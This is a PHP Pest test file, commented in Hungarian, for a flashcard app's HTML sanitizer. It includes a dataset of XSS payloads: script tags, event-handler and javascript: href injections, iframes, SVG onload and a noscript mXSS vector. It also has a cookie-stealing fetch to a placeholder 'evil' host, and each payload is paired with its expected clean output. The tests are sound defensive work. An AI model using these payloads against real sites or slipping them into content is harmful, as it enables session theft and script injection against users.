<?php

use App\Models\Flashcard;
use App\Models\FlashcardDeck;
use App\Models\User;
use App\Support\HtmlSanitizer;

/**
 * A kártyák rich-text mezői tároláskor szerveroldalon is szűrődnek (F7-L3): a
 * fegyverezett HTML be sem kerül az adatbázisba, az ártalmatlan tartalom pedig
 * bájtra változatlan marad.
 */
beforeEach(function () {
    if (! HtmlSanitizer::isSupported()) {
        $this->markTestSkipped('A HTML5-parser (Dom\HTMLDocument) PHP 8.4-től érhető el.');
    }
});

dataset('dangerous payloads', [
    'script' => ['<p>ok</p><script>fetch("//evil/"+document.cookie)</script>', '<p>ok</p>'],
    'img onerror' => ['<img src=x onerror=alert(1)>szó', 'szó'],
    'inline handler' => ['<b onclick="alert(1)">szó</b>', '<b>szó</b>'],
    'javascript href' => ['<a href="javascript:alert(1)">x</a>', '<a>x</a>'],
    'entity-encoded javascript href' => ['<a href="&#106;avascript:alert(1)">x</a>', '<a>x</a>'],
    'data href' => ['<a href="data:text/html,<script>1</script>">x</a>', '<a>x</a>'],
    'iframe' => ['<iframe src="https://evil"></iframe>szó', 'szó'],
    'svg onload' => ['<svg onload=alert(1)><circle/></svg>szó', 'szó'],
    'style tag' => ['<style>body{display:none}</style>szó', 'szó'],
    'style url' => ['<span style="background:url(//evil)">x</span>', '<span>x</span>'],
    'unknown tag unwrapped' => ['<details><summary>a</summary>b</details>', 'ab'],
    'nested unknown with handler' => ['<custom-el><b onmouseover=x>a</b></custom-el>', '<b>a</b>'],
    'noscript mxss' => ['<noscript><p title="</noscript><img src=x onerror=alert(1)>">', ''],
]);

test('a veszélyes markup kiszűrődik', function (string $dirty, string $expected) {
    expect(HtmlSanitizer::clean($dirty))->toBe($expected);
})->with('dangerous payloads');

test('az ártalmatlan tartalom bájtra változatlan marad', function (?string $value) {
    expect(HtmlSanitizer::clean($value))->toBe($value);
})->with([
    'null' => [null],
    'sima szöveg' => ['rock & roll'],
    'kisebb-jel szövegben' => ['a < b'],
    'szerkesztő kimenete' => ['<p>The <strong>quick</strong> fox &amp; <em>dog</em></p><ul><li>egy</li></ul>'],
    'engedett style' => ['<span style="color: red">piros</span>'],
    'aposztróf' => ["<p>it's</p>"],
]);

test('a linkek rel/target-et kapnak, a biztonságos href megmarad', function () {
    expect(HtmlSanitizer::clean('<a href="https://example.com">x</a>'))
        ->toBe('<a href="https://example.com" rel="noopener noreferrer nofollow" target="_blank">x</a>');
});

test('a szerveroldali allowlista megegyezik a kliensoldali sanitize-html.ts listáival', function () {
    $source = file_get_contents(resource_path('js/lib/sanitize-html.ts'));

    $listFromTs = function (string $constant) use ($source): array {
        preg_match('/const '.$constant.' = new Set\(\[(.*?)\]\)/s', $source, $match);
        preg_match_all("/'([^']+)'/", $match[1] ?? '', $items);

        return $items[1];
    };

    expect($listFromTs('ALLOWED_TAGS'))->toBe(HtmlSanitizer::ALLOWED_TAGS)
        ->and($listFromTs('DROP_TAGS'))->toBe(HtmlSanitizer::DROP_TAGS)
        ->and($listFromTs('ALLOWED_ATTRS'))->toBe(HtmlSanitizer::ALLOWED_ATTRS);
});

test('a bővítményből érkező kártya szűrve kerül az adatbázisba', function () {
    $user = User::factory()->create();
    $deck = FlashcardDeck::create(['user_id' => $user->id, 'name' => 'Deck']);

    $this->actingAs($user)
        ->postJson(route('extension.create-flashcard'), [
            'deck_id' => $deck->id,
            'front' => '<img src=x onerror=alert(1)><script>fetch("//evil/"+document.cookie)</script>apple',
            'back' => 'alma',
            'direction' => 'front_to_back',
            'back_notes' => '<b onclick="x">jegyzet</b>',
        ])
        ->assertSuccessful();

    $card = Flashcard::firstOrFail();

    expect($card->front)->toBe('apple')
        ->and($card->back)->toBe('alma')
        ->and($card->back_notes)->toBe('<b>jegyzet</b>');
});

test('a webes létrehozás és szerkesztés is szűr', function () {
    $user = User::factory()->create();
    $deck = FlashcardDeck::create(['user_id' => $user->id, 'name' => 'Deck']);

    $this->actingAs($user)
        ->post(route('flashcards.cards.store', $deck), [
            'front' => '<p onmouseover="x">front</p>',
            'back' => 'back',
            'direction' => 'front_to_back',
        ])
        ->assertSessionHasNoErrors();

    $card = Flashcard::firstOrFail();
    expect($card->front)->toBe('<p>front</p>');

    $this->actingAs($user)
        ->patch(route('flashcards.cards.update', [$deck, $card]), [
            'front' => '<p>front</p>',
            'back' => '<iframe src="//evil"></iframe>új',
            'direction' => 'front_to_back',
            'front_notes' => '<a href="javascript:alert(1)">link</a>',
        ])
        ->assertSessionHasNoErrors();

    expect($card->fresh())
        ->back->toBe('új')
        ->front_notes->toBe('<a>link</a>');
});
